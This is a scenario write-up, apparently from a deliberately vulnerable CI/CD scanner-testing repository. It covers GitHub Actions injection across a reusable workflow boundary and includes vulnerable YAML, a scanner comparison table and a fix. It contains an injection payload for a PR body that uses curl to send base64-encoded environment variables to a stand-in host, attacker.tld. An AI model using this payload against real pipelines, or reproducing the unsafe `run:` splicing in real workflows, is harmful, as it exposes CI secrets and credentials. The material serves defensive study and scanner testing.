# Scenario 28: Reusable workflow `${{ inputs.* }}` injection

**OWASP CICD-SEC mapping:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable workflow:**
- Caller: [`.github/workflows/scenario-28-reusable-workflow-input-injection.yml`](../../.github/workflows/scenario-28-reusable-workflow-input-injection.yml)
- Reusable: [`.github/workflows/_reusable-build-and-test.yml`](../../.github/workflows/_reusable-build-and-test.yml)

## The pattern

Reusable workflows (`on: workflow_call:`) take inputs via `with:` from
their caller, the same way a function takes arguments. Inside, those
inputs surface as `${{ inputs.X }}` — and if the reusable workflow
splices that into a `run:` block, it's a shell-injection sink. The
twist that makes this distinct from scenario 13 (workflow_dispatch
input injection) or scenario 18 (composite action input injection) is
that the taint crosses a `workflow_call` boundary: the unsafe expansion
lives in a *different file* than the untrusted source. Static analyzers
that scan one workflow at a time can see the sink, can see the source,
but may not connect them.

The reusable in this scenario:

```yaml
# .github/workflows/_reusable-build-and-test.yml
inputs:
  build-args:
    type: string
run: |
  echo "Building with args: ${{ inputs.build-args }}"
  ./build.sh ${{ inputs.build-args }}
```

The caller passes `github.event.pull_request.body` — fully attacker-
controlled by anyone who can open a PR — straight in:

```yaml
# .github/workflows/scenario-28-reusable-workflow-input-injection.yml
jobs:
  call-build:
    uses: ./.github/workflows/_reusable-build-and-test.yml
    with:
      build-args: ${{ github.event.pull_request.body }}
```

## How an attacker exploits it

Open a PR with this body:

```
"; curl -d "$(env | base64)" attacker.tld; #
```

The `pull_request` trigger fires, the caller's `with: build-args:`
expands to the PR body, the reusable workflow receives it as
`inputs.build-args`, and the `run:` line becomes:

```bash
echo "Building with args: "; curl -d "$(env | base64)" attacker.tld; #"
./build.sh "; curl -d "$(env | base64)" attacker.tld; #
```

Runner exfiltrates the workflow's env to the attacker. The
`pull_request` trigger from forks runs with a read-only `GITHUB_TOKEN`
and no secrets exposed, which caps the blast radius — but the same
bug shape under `pull_request_target` (or with `secrets:` forwarded to
the reusable) is full credential exposure. See scenario 06 for the
`secrets: inherit` half.

## Expected scanner coverage

| Scanner   | Detection |
|-----------|-----------|
| pipeline-check | candidate: `GHA-003` (template-injection) fires on `${{ inputs.* }}` inside `run:` on the reusable side; whether the cross-file taint to the caller's `github.event.*` source is rendered explicitly depends on the rule's reach |
| zizmor    | `template-injection` may fire on the reusable workflow's `run:` block (same shape as scenario 13/18); cross-file source attribution is the harder part |
| poutine   | unknown — composite + reusable scanning is newer territory |
| checkov   | partial — workflow-only rules, unlikely to follow `workflow_call` |
| kics      | partial |

This is the **cross-`workflow_call`-boundary** comparison datapoint.
Scanners that only analyze one workflow file at a time can see the
sink (in `_reusable-build-and-test.yml`) and can see the unsafe
source (in `scenario-28-...yml`) but may not connect them through the
`uses: ./.../foo.yml + with:` linkage.

## Fix

In the reusable, route untrusted inputs through `env:` rather than
splicing them into `run:`:

```yaml
# .github/workflows/_reusable-build-and-test.yml
- name: Build
  env:
    BUILD_ARGS: ${{ inputs.build-args }}
  run: |
    echo "Building with args: $BUILD_ARGS"
    ./build.sh "$BUILD_ARGS"
```

For defense in depth, validate the input in the caller before passing
it to the reusable (regex against expected shape, length cap, allowlist
of expected senders). Even better: don't forward unstructured PR
metadata to build steps at all — pass the SHA you want built and let
the build derive its own arguments.

## References

- GitHub docs — "Reusing workflows":
  https://docs.github.com/en/actions/using-workflows/reusing-workflows
- GitHub Security Lab — "Keeping your GitHub Actions and workflows
  secure: Untrusted input":
  https://securitylab.github.com/research/github-actions-untrusted-input/
